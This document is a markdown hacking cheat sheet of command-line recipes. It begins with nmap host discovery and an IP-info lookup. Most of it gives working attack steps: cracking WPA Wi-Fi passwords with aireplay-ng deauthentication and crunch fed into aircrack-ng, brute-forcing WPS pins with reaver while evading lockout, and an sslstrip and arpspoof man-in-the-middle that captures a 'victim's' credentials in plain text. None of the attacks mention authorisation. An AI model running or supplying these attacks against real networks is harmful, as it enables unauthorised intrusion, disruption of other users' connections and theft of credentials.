## NMAP
### Scanning a range of IPs to check for alive hosts and checking them
- `nmap [domain/ip]` -> scan
- `-v` for verbosity (`-vv` for greater effect)
- `-oG` to make the output Grepable
- `nmap -oG - 10.0.2.0-255 -p 22 -vv > scan` -> scan IPs from 192.168.1.0 to 192.168.1.255, checking only port 22, with great verbosity, and store the output in the `scan` document. Example output
```
...
Host: 10.0.2.251 ()	Status: Down
Host: 10.0.2.252 ()	Status: Down
Host: 10.0.2.253 ()	Status: Down
Host: 10.0.2.254 ()	Status: Down
Host: 10.0.2.255 ()	Status: Down
Host: 10.0.2.2 ()	Status: Up
Host: 10.0.2.2 ()	Ports: 22/filtered/tcp//ssh///
Host: 10.0.2.3 ()	Status: Up
Host: 10.0.2.3 ()	Ports: 22/filtered/tcp//ssh///
...
```
- `cat scan | grep Up` to get only Hosts with `Status: Up`. Example output
```
Host: 10.0.2.2 ()	Status: Up
Host: 10.0.2.3 ()	Status: Up
Host: 10.0.2.4 ()	Status: Up
Host: 10.0.2.15 ()	Status: Up
```
- `cat scan | grep Up | awk -F " " '{print $2}'` pipe the example output above into `awk`, splitting each line at space character and printing only the second argumemt of the split (aka the IP address). Example output
```
10.0.2.2
10.0.2.3
10.0.2.4
10.0.2.15
```
- `cat scan | grep Up | awk -F " " '{print $2}' > scan2` to save the output above into a new file
- `nmap -iL scan2 -vv` to do a full scan on ONLY alive hosts (got in previous steps) instead of checking them all. `-iL` is to get the input from a file

---

## Check info on IP (up to 1000 a day)
- `curl ipinfo.io/[ip]`
- `curl ipinfo.io/74.207.244.221` Example output:
```
{
  "ip": "74.207.244.221",
  "hostname": "li86-221.members.linode.com",
  "city": "Fremont",
  "region": "California",
  "country": "US",
  "loc": "37.5483,-121.9886",
  "org": "AS63949 Linode, LLC",
  "postal": "94536"
}
```

---

## Hack WiFi Password

- `ifconfig` to get wireless card (i.e. `wlan0`)
- `ifconfig wlan0 down` - bring down
- `iwconfig wlan0 mode monitor` - start monitoring
- `ifconfig wlan0 up` - bring back up
- `airmon-ng check wlan0` - see if there are processes that might cause interference (i.e. NetowrkManager spawns other processes that might interfere)
- `kill <process ID>` - kill every process in order
- `airodump-ng wlan0` to list all connections that the wireless card can get to
- `airodump-ng -c <CHANNEL> --bssid <MAC/BSSID> -w <NAME> wlan0` where all the variables can be got with previous command, and name is a filename where to store output
- `aireplay-ng -0 0 -a <MAC/BSSID> wlan0` - disconnects all devices connected to the MAC you are attacking
- `crunch <MIN_LENGHT> <MAX_LENGTH> <POSSIBLE_CHARS> [OPTIONS] | aircrack-ng -w - <NAME from 2 commands up> -e <ESSID>` - generate all possible words from MIN_LENGTH to MAX_LENGTH characters with given options, piping them to aircrack-ng that uses the file with the name generated before to try cracking the router with given ESSID.

### TIPS:
- if ESSID is made of more than 1 word, wrap in ""
- if error "No valid WPA handshakes found", make sure you killed all the processes already running on your wireless card, with `airmon-ng check <CARD>`

---

## Hack WPS Pin
- monitor wireless card (see above)
- check and kill any process already running (see above)
- `reaver -b <MAC> -i <WIRELESS CARD> -c <CHANNEL> -vv` - start cracking
- `reaver -i <WIRELESS_CARD> -b <MAC> -r <TRIES>:<SECONDS>` - this way we can define a maximum amount of tries per seconds to avoid being blocked out

---

## SSL Strip
Objective: intercept all unencrypted packages going through the network
- `apt-get install dsniff` - to be able to run arpspoof
- `echo 1 > /proc/sys/net/ipv4/ip_forward` - to enable ip-forwarding
- `iptables -t nat -A(append) PREROUTING -p(protocol) tcp --destination-port 80 -j REDIRECT --to-port 8080` - to redirect all traffic to port 8080
- `iptables -I INPUT 1 -p tcp --dport 8080 -j ACCEPT` - to open port 8080 to get all the redirected traffic
- `route` - to get the local IP range
- `nmap xxx.xxx.xxx.0-254 -vv` - where the IP address comes from the previous command to get a list of connected IP addresses and find the victim
- `sslstrip -l 8080` - to enable stripping
- `arpspoof -t(target) <IP from above> <HOST aka router IP>` - to start redirecting the packages from the victim IP to the host through you
- `tail -f sslstrip.log` - to read through the intercepted traffic. All credentials sent on HTTP sites are intercepted in plain text
